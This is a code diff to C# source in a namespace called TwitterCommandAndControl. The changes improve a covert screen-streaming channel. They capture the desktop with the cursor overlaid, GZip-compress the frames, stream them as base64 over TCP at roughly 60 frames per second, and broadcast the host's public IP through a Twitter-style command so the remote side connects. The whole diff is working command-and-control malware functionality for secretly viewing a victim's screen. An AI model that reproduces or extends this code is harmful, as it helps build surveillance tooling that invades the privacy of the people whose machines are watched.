@@ -2,11 +2,13 @@
 using System.Collections.Generic;
 using System.Drawing;
 using System.IO;
+using System.IO.Compression;
 using System.Linq;
 using System.Net;
 using System.Net.Sockets;
 using System.Runtime.InteropServices;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 
 namespace TwitterCommandAndControl
@@ -28,8 +30,8 @@ namespace TwitterCommandAndControl
                     {
                         tcpClient.Connect(ip, PORT);
                         using (networkStream = tcpClient.GetStream())
-                        using (var reader = new StreamReader(networkStream))
-                        using (var writer = new StreamWriter(networkStream))
+                        using (var gzipStream = new GZipStream(networkStream, CompressionMode.Compress))
+                        using (var writer = new StreamWriter(gzipStream))
                         {
                             while (tcpClient.Connected)
                             {
@@ -40,7 +42,7 @@ namespace TwitterCommandAndControl
                                     writer.WriteLine(System.Convert.ToBase64String(memoryStream.ToArray()));
                                     writer.Flush();
                                 }
-                                if (reader.ReadLine() != "X") return;
+                                Thread.Sleep(1000 / 60);
                             }
                         }
                     }
@@ -59,7 +61,7 @@ namespace TwitterCommandAndControl
                 client = listener.AcceptTcpClient();
                 listener.Stop();
             });
-            Messenger.Send(commandPrefix + " #screen #ip=127.0.0.1");
+            Messenger.Send(commandPrefix + " #screen #ip=" + GetPublicIP.GetIP());
             listenerTask.Wait();
             return client;
         }
@@ -92,6 +94,22 @@ namespace TwitterCommandAndControl
 
         private class PlatformInvokeUSER32
         {
+            [StructLayout(LayoutKind.Sequential)]
+            public struct CURSORINFO
+            {
+                public Int32 cbSize;
+                public Int32 flags;
+                public IntPtr hCursor;
+                public POINTAPI ptScreenPos;
+            }
+
+            [StructLayout(LayoutKind.Sequential)]
+            public struct POINTAPI
+            {
+                public int x;
+                public int y;
+            }
+
             public const int SM_CXSCREEN = 0;
             public const int SM_CYSCREEN = 1;
 
@@ -109,12 +127,17 @@ namespace TwitterCommandAndControl
 
             [DllImport("user32.dll", EntryPoint = "ReleaseDC")]
             public static extern IntPtr ReleaseDC(IntPtr hWnd, IntPtr hDc);
+
+            [DllImport("user32.dll", EntryPoint = "GetCursorInfo")]
+            public static extern bool GetCursorInfo(out CURSORINFO pci);
+
+            [DllImport("user32.dll", EntryPoint = "DrawIcon")]
+            public static extern bool DrawIcon(IntPtr hDC, int X, int Y, IntPtr hIcon);
         }
 
         private class CaptureScreen
         {
-            protected static IntPtr m_HBitmap;
-
+            const Int32 CURSOR_SHOWING = 0x00000001;
 
             public static Bitmap GetDesktopImage()
             {
@@ -141,6 +164,22 @@ namespace TwitterCommandAndControl
                                                    GetDesktopWindow(), hDC);
                     Bitmap bmp = System.Drawing.Image.FromHbitmap(hBitmap);
                     PlatformInvokeGDI32.DeleteObject(hBitmap);
+                    using (Graphics g = Graphics.FromImage(bmp))
+                    {
+                        g.CopyFromScreen(0, 0, 0, 0, new Size(size.cx, size.cy), CopyPixelOperation.SourceCopy);
+
+                        PlatformInvokeUSER32.CURSORINFO pci;
+                        pci.cbSize = System.Runtime.InteropServices.Marshal.SizeOf(typeof(PlatformInvokeUSER32.CURSORINFO));
+                        if (PlatformInvokeUSER32.GetCursorInfo(out pci))
+                        {
+                            if (pci.flags == CURSOR_SHOWING)
+                            {
+                                PlatformInvokeUSER32.DrawIcon(g.GetHdc(), pci.ptScreenPos.x, pci.ptScreenPos.y, pci.hCursor);
+                                g.ReleaseHdc();
+                            }
+                        }
+                    }
+
                     GC.Collect();
                     return bmp;
                 }
